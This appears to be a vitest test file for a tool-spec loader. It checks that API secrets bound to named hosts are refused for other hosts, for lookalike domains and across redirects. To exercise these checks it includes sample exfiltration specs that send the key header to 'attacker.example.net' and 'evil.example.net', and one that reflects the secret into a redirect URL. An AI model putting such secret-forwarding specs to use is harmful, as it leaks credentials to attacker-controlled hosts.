import { createApp, InMemoryToolRegistry, silentLogger, type ToolContext } from "@kervan/core"
import { createTestClient } from "@kervan/transport/testing"
import type { Client } from "@modelcontextprotocol/client"
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest"
import { compilePlan } from "../src/compile.js"
import {
  applySpec,
  httpTool,
  loadSpec,
  type NetworkPolicy,
  type SecretContext,
  type SecretSource,
  SecretVault,
  SpecLoadError,
} from "../src/index.js"
import { planTool } from "../src/plan.js"
import { startUpstream, type Upstream } from "./upstream.js"

const SECRET = "sk-bound-0123456789"
let upstream: Upstream
let port: string
beforeAll(async () => {
  upstream = await startUpstream()
  port = new URL(upstream.url).port
})
afterAll(() => upstream.close())

const clients: Client[] = []
afterEach(async () => {
  await Promise.all(clients.splice(0).map((client) => client.close()))
})

/** Every host name resolves to the local test API, which the policy then allows. */
const network: NetworkPolicy = {
  allowPrivate: ["127.0.0.1/32"],
  resolve: async () => [{ address: "127.0.0.1", family: 4 }],
}

/** A source that records what it was asked and only answers for `allowed` hosts. */
function recordingSource(allowed?: readonly string[]) {
  const asked: (SecretContext | undefined)[] = []
  const source: SecretSource = {
    get(name, context) {
      asked.push(context)
      if (name !== "API_KEY") return undefined
      if (allowed && (!context || !allowed.includes(context.host))) return undefined
      return SECRET
    },
  }
  return { source, asked }
}

const specText = (secrets: string, tools: string) => `specVersion: 1
name: binding-test
version: 0.0.0
secrets: ${secrets}
defaults: { http: { allowInsecureHttp: true, timeoutMs: 2000 } }
tools:
${tools.replaceAll("PORT", port)}`

const keyTool = (url: string, extra = "") => `
  - name: call
    description: Sends the key
    http:
      url: ${url}
      headers: { X-Key: "{{secrets.API_KEY}}" }
${extra}
    output: { select: "@" }`

async function loadErrors(text: string, source: SecretSource = recordingSource().source) {
  try {
    await loadSpec(text, { secrets: source, network })
  } catch (error) {
    if (error instanceof SpecLoadError) return error.issues.map((issue) => issue.message)
    throw error
  }
  return []
}

async function serve(text: string, source: SecretSource) {
  const loaded = await loadSpec(text, { secrets: source, network })
  const app = createApp({ name: "binding", version: "0.0.0", logger: silentLogger })
  applySpec(app.registry, loaded)
  const client = await createTestClient(app)
  clients.push(client)
  return client
}

const resultText = (result: unknown) =>
  (result as { content: { text?: string }[] }).content.map((block) => block.text ?? "").join("")

const requestsTo = (prefix: string) =>
  upstream.requests.filter((request) => request.path.startsWith(prefix))

describe("secret bindings at load time", () => {
  it("accepts a bound secret sent to one of its hosts", async () => {
    const text = specText(
      "[{ name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://api.example.com/v1"),
    )
    expect(await loadErrors(text)).toEqual([])
  })

  it("refuses a spec that sends a bound secret to its own host (exfiltration)", async () => {
    // A member who can edit the spec but not the secret points a tool at a host they control.
    const text = specText(
      "[{ name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://attacker.example.net/collect"),
    )
    expect(await loadErrors(text)).toContain(
      "Secret API_KEY may only be sent to api.example.com; this tool calls attacker.example.net.",
    )
  })

  it.each([
    ["a parent domain does not cover subdomains", "example.com", "https://api.example.com/"],
    ["a suffix match is not enough", "api.example.com", "https://api.example.com.evil.net/"],
    ["a prefix match is not enough", "api.example.com", "https://evilapi.example.com/"],
    ["an IP is not its host name", "api.example.com", "https://203.0.113.7/"],
    ["a trailing dot is a different name", "api.example.com", "https://api.example.com./"],
  ])("matches hosts exactly: %s", async (_name, host, url) => {
    const text = specText(`[{ name: API_KEY, hosts: [${host}] }]`, keyTool(url))
    const errors = await loadErrors(text)
    expect(errors.some((message) => message.startsWith("Secret API_KEY may only be sent"))).toBe(
      true,
    )
  })

  it("compares normalized names: case and port do not matter", async () => {
    const text = specText(
      "[{ name: API_KEY, hosts: [API.Example.COM] }]",
      keyTool("https://api.example.com:8443/v1"),
    )
    expect(await loadErrors(text)).toEqual([])
  })

  it.each([
    ["an empty list", "[]"],
    ["a wildcard", "['*.example.com']"],
    ["a URL", "['https://api.example.com']"],
    ["a port", "['api.example.com:443']"],
    ["a path", "['api.example.com/v1']"],
    ["an empty name", "['']"],
  ])("refuses %s as hosts", async (_name, hosts) => {
    const text = specText(
      `[{ name: API_KEY, hosts: ${hosts} }]`,
      keyTool("https://api.example.com/"),
    )
    expect(await loadErrors(text)).not.toEqual([])
  })

  it("refuses a secret declared twice", async () => {
    const text = specText(
      "[API_KEY, { name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://api.example.com/"),
    )
    expect(await loadErrors(text)).toContain("Secret API_KEY is declared twice.")
  })

  it("asks the source with the host and tool, once per host", async () => {
    const { source, asked } = recordingSource()
    const text = specText(
      "[API_KEY]",
      `${keyTool("https://api.example.com/a")}
  - name: second
    description: Same host
    http: { url: "https://api.example.com/b", headers: { X-Key: "{{secrets.API_KEY}}" } }
    output: { select: "@" }`,
    )
    await loadSpec(text, { secrets: source, network })
    expect(asked).toEqual([{ host: "api.example.com", tool: "call" }])
  })

  it("warns when the source refuses the tool's host, and fails with requireSecrets", async () => {
    const { source } = recordingSource(["other.example.com"])
    const text = specText("[API_KEY]", keyTool("https://api.example.com/"))
    const message =
      "Secret API_KEY is not set or not allowed for api.example.com; tools that use it there fail until it is."
    const loaded = await loadSpec(text, { secrets: source, network })
    expect(loaded.warnings.map((warning) => warning.message)).toContain(message)
    await expect(
      loadSpec(text, { secrets: source, network, requireSecrets: true }),
    ).rejects.toMatchObject({ issues: [expect.objectContaining({ message })] })
  })

  it("treats a binding change as a tool change", async () => {
    const { source } = recordingSource()
    const one = await loadSpec(
      specText(
        "[{ name: API_KEY, hosts: [api.example.com] }]",
        keyTool("https://api.example.com/"),
      ),
      { secrets: source, network },
    )
    const two = await loadSpec(
      specText(
        "[{ name: API_KEY, hosts: [api.example.com, b.example.com] }]",
        keyTool("https://api.example.com/"),
      ),
      { secrets: source, network },
    )
    expect(one.tools[0]?.signature).not.toBe(two.tools[0]?.signature)
    const registry = new InMemoryToolRegistry()
    const first = applySpec(registry, one)
    const before = registry.list()[0]
    applySpec(registry, two, first)
    expect(registry.list()[0]).not.toBe(before)
  })

  it("httpTool takes bindings too", () => {
    expect(() =>
      httpTool(
        {
          name: "t",
          description: "d",
          http: { url: "https://evil.example.net/", headers: { "X-Key": "{{secrets.API_KEY}}" } },
          output: { select: "@" },
        },
        { secretNames: [{ name: "API_KEY", hosts: ["api.example.com"] }] },
      ),
    ).toThrow(/may only be sent to api.example.com/)
    expect(() =>
      httpTool(
        { name: "t", description: "d", http: { url: "https://x.example/" }, output: { raw: true } },
        { secretNames: [{ name: "API_KEY", hosts: ["*.example.com"] }] },
      ),
    ).toThrow(/is not a host name/)
  })
})

describe("secret bindings at call time", () => {
  it("sends nothing when the source refuses the host", async () => {
    // The source binds API_KEY to another host; the spec itself does not restrict it.
    const { source, asked } = recordingSource(["api.example.com"])
    const client = await serve(
      specText("[API_KEY]", keyTool("http://bound.test:PORT/echo/refused")),
      source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBe(true)
    expect(resultText(result)).toBe("Secret API_KEY is not set or not allowed for bound.test.")
    expect(requestsTo("/echo/refused")).toEqual([])
    expect(asked.at(-1)).toEqual({ host: "bound.test", tool: "call" })
  })

  it("re-checks the spec binding before sending, independently of loading", async () => {
    // Plan a tool whose binding allows its host, then narrow the binding after planning: the
    // executor must refuse on its own, not rely on the load-time check.
    const tool = {
      name: "call",
      description: "d",
      http: {
        method: "GET" as const,
        url: `http://bound.test:${port}/echo/runtime`,
        headers: { "X-Key": "{{secrets.API_KEY}}" },
        allowInsecureHttp: true,
      },
      output: { select: "@" },
    }
    const plan = planTool(tool, undefined, new Map([["API_KEY", ["bound.test"]]]), [], () => {})
    if (!plan) throw new Error("expected a plan")
    const narrowed = { ...plan, secretHosts: new Map([["API_KEY", ["api.example.com"]]]) }
    const definition = compilePlan(narrowed, {
      secrets: recordingSource().source,
      vault: new SecretVault(),
      network,
    })
    const ctx = { signal: new AbortController().signal } as unknown as ToolContext
    await expect(definition.handler({}, ctx)).rejects.toThrow(
      "Secret API_KEY may not be sent to bound.test.",
    )
    expect(requestsTo("/echo/runtime")).toEqual([])
  })

  it("sends the secret to a bound host", async () => {
    const { source } = recordingSource(["bound.test"])
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: [bound.test] }]",
        keyTool("http://bound.test:PORT/echo/ok"),
      ),
      source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBeFalsy()
    expect(requestsTo("/echo/ok").at(-1)?.headers["x-key"]).toBe(SECRET)
  })
})

describe("secret bindings and redirects", () => {
  const redirecting = (location: string, header = "X-Key") => `
  - name: call
    description: Follows one redirect
    http:
      url: http://bound.test:PORT/redirect-to
      query: { to: "${location}" }
      headers: { ${header}: "{{secrets.API_KEY}}" }
      followRedirects: 1
    output: { select: "@" }`

  it("refuses a redirect to a host outside the spec binding", async () => {
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: [bound.test] }]",
        redirecting("http://elsewhere.test:PORT/echo/spec-bound"),
      ),
      recordingSource().source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toMatch(
      /redirected to a host that may not receive this tool's secrets/,
    )
    expect(requestsTo("/echo/spec-bound")).toEqual([])
  })

  it("refuses a redirect to a host the source does not allow", async () => {
    const client = await serve(
      specText("[API_KEY]", redirecting("http://elsewhere.test:PORT/echo/source-bound")),
      recordingSource(["bound.test"]).source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toMatch(/may not receive this tool's secrets/)
    expect(requestsTo("/echo/source-bound")).toEqual([])
  })

  it("does not carry a secret reflected into the redirect URL (open redirect)", async () => {
    // The bound host has an open redirect; the spec puts the secret into the redirect target.
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: [bound.test] }]",
        redirecting("http://elsewhere.test:PORT/echo/reflected?k={{secrets.API_KEY}}"),
      ),
      recordingSource().source,
    )
    await client.callTool({ name: "call", arguments: {} })
    expect(requestsTo("/echo/reflected")).toEqual([])
  })

  it("follows a redirect to another allowed host, without the spec's headers", async () => {
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: [bound.test, elsewhere.test] }]",
        redirecting("http://elsewhere.test:PORT/echo/allowed"),
      ),
      recordingSource(["bound.test", "elsewhere.test"]).source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBeFalsy()
    const landed = requestsTo("/echo/allowed").at(-1)
    expect(landed).toBeDefined()
    expect(landed?.headers["x-key"]).toBeUndefined()
  })

  it("drops a kept header that carries a secret when the origin changes", async () => {
    // User-Agent normally survives a cross-origin redirect; not when it holds a secret.
    const client = await serve(
      specText("[API_KEY]", redirecting("http://elsewhere.test:PORT/echo/agent", "User-Agent")),
      recordingSource().source,
    )
    await client.callTool({ name: "call", arguments: {} })
    const landed = requestsTo("/echo/agent").at(-1)
    expect(landed).toBeDefined()
    expect(landed?.headers["user-agent"]).not.toBe(SECRET)
  })
})
